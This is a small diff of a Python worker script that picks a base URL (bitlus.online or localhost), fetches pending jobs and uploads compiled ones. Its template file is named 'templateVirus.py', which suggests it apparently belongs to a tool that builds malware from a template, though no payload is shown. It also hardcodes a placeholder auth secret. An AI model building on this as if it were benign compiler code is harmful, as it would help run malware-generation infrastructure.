@@ -7,16 +7,16 @@ import subprocess
 
 # Helper function to allow both external and localhost calls
 def get_base_url():
-    external_url = "https://bitlus.online"
-    local_url = "http://127.0.0.1"
+    external_url = "https://www.bitlus.online"
+    local_url = "http://127.0.0.1:5000"
     try:
         # Try reaching the external domain
-        response = requests.head(external_url, timeout=2) 
+        response = requests.get(external_url, timeout=2) 
         if response.status_code == 200:
-            print(f"External domain '{external_url}' is reachable.")
+            print(f"### External domain '{external_url}' is reachable.")
             return external_url
     except requests.RequestException:
-        print(f"External domain '{external_url}' is not reachable. Falling back to localhost.")
+        print(f"### External domain '{external_url}' is not reachable. Falling back to localhost.")
     # Fallback to localhost
     print(local_url)
     return local_url
@@ -24,8 +24,8 @@ def get_base_url():
 # API URLs and secrets
 base_url = get_base_url()
 
-api_get_url = f"{base_url}:5000/api/getpendingjob"
-api_upload_url = f"{base_url}:5000/api/uploadcompiledjob"
+api_get_url = f"{base_url}/api/getpendingjob"
+api_upload_url = f"{base_url}/api/uploadcompiledjob"
 secret = "verySecretAuth"  # Authorization header for fetching pending jobs, would have to be made an actual key which would be shared on deploying the compiler
 # Paths and filenames
 template_path = "templateVirus.py"
